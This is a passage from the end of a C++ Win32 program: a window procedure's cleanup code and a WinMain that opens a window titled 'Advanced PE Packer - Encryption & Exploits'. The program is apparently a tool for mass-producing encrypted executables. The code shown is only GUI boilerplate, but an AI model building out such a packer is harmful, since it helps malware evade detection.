                    CloseHandle(g_massGenerationThread);
                }
            }
            DestroyWindow(hwnd);
            break;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

// WinMain function
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Kill any running instances
    killRunningInstances();
    
    const wchar_t CLASS_NAME[] = L"GUIPackerWindow";
    
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    
    RegisterClass(&wc);
    
    g_hMainWindow = CreateWindowEx(
        0,
        CLASS_NAME,
        L"Advanced PE Packer - Encryption & Exploits",
        WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME,
        CW_USEDEFAULT, CW_USEDEFAULT, 580, 380,
        NULL, NULL, hInstance, NULL
    );
    
    if (g_hMainWindow == NULL) {
        return 0;
    }
    
    ShowWindow(g_hMainWindow, nCmdShow);
    UpdateWindow(g_hMainWindow);
    
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}